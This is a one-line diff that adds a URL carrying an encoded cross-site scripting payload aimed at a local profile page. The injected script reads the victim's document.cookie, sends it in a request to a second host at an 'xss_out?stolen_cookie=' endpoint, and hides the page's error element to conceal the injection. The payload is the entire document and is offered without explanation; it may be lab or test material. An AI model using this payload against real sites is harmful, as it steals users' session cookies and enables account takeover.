@@ -1,0 +1,1 @@
+http://localhost:8080/profile/%3Cscript%3Evar%20xhr%20=%20new%20XMLHttpRequest();xhr.open('GET','http://localhost:8081/xss_out%3Fstolen_cookie%3D'+document.cookie,true);xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');xhr.send('stolen_cookie=123');document.getElementsByClassName(%22error%22)[0].style.display='none';%3C/script%3E
